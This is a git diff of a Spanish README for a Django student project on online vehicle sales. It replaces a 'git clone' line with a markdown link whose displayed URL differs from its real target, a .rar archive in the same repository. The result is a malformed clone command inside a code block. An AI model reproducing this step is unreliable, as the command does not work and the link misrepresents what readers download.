@@ -18,7 +18,7 @@ Siga estos pasos para configurar y ejecutar el proyecto **"VENTA VIRTUAL DE VEHÃ
 Clone o descargue el repositorio del proyecto desde el siguiente enlace:
 
 ```
-git clone https://github.com/tantipann/bootcamp_python/tree/8f5175fde924d6197d906b8b9dc451dafe6a626e/Modulo06/Evaluacion/proyecto_vehiculos_django.git
+git clone [https://github.com/tantipann/bootcamp_python/tree/8f5175fde924d6197d906b8b9dc451dafe6a626e/Modulo06/Evaluacion/proyecto_vehiculos_django.git](https://github.com/tantipann/bootcamp_python/blob/c06b92fc6c9911aedb6da224cc69ca89cafc101a/Modulo06/Evaluacion/proyecto_vehiculos_django.rar)
 ```
 
 Ingrese al directorio del proyecto:
